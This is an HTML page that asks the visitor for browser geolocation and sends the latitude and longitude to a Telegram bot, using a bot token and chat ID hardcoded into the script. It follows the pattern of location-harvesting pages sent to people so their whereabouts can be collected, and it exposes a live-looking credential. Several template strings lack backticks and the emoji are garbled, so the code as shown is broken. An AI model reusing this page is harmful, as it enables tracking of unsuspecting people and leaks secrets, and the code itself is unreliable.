<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send Location to Telegram</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
/* GPS spinning animation */
@keyframes spin {
  0% { transform: rotate(0deg);}
  100% { transform: rotate(360deg);}
}
.spinner {
  animation: spin 1s linear infinite;
}

/* Fade-in animation for the button */
.fade-in {
  opacity: 0;
  transform: translateY(20px);
  animation: fadeInUp 0.8s forwards;
}
@keyframes fadeInUp {
  to { opacity: 1; transform: translateY(0);}
}
</style>
</head>
<body class="bg-gradient-to-r from-blue-400 via-purple-500 to-pink-500 h-screen flex items-center justify-center font-sans">
<div class="bg-white rounded-3xl shadow-2xl p-10 w-full max-w-md text-center">
    <h1 class="text-2xl font-bold mb-4">Please Enable Your Location</h1>
    <div id="status" class="text-gray-700 mb-6 flex justify-center items-center">
        <svg class="spinner w-8 h-8 mr-2 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <circle cx="12" cy="12" r="10" stroke-width="4" stroke-linecap="round"></circle>
        </svg>
        Waiting for location...
    </div>
    <button id="sendLocation" class="fade-in bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-full shadow-lg transition-all duration-300" style="display:none;">
        Send Location to Telegram
    </button>
</div>

<script>
const BOT_TOKEN = "7851461640:AAFsqqe9niiYzPRuAZl3qK22e8aX3ZdJk4k";
const CHAT_ID = "7570861617";

function showError(message){
    document.getElementById("status").innerHTML = <span class="text-red-500 font-semibold">${message}</span>;
}

function sendLocationToTelegram(lat, lon) {
    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: ðŸ“ User Location:\nLatitude: ${lat}\nLongitude: ${lon}
        })
    }).then(res => {
        if(res.ok){
            document.getElementById("status").innerHTML = "âœ… Location sent successfully!";
            document.getElementById("sendLocation").style.display = "none";
        } else {
            showError("Error sending location! Please try again.");
        }
    }).catch(err => showError("Error: " + err));
}

function requestLocation() {
    if(!navigator.geolocation){
        showError("Geolocation is not supported by your browser!");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            document.getElementById("status").innerHTML = "ðŸ“ Location ready to send.";
            const btn = document.getElementById("sendLocation");
            btn.style.display = "inline-block";
            btn.onclick = () => sendLocationToTelegram(lat, lon);
        },
        error => {
            if(error.code === error.PERMISSION_DENIED){
                showError("Please enable location access to continue.");
            } else {
                showError("Error getting location: " + error.message);
            }
        }
    );
}

// Request location on page load
requestLocation();
</script>
</body>
</html>
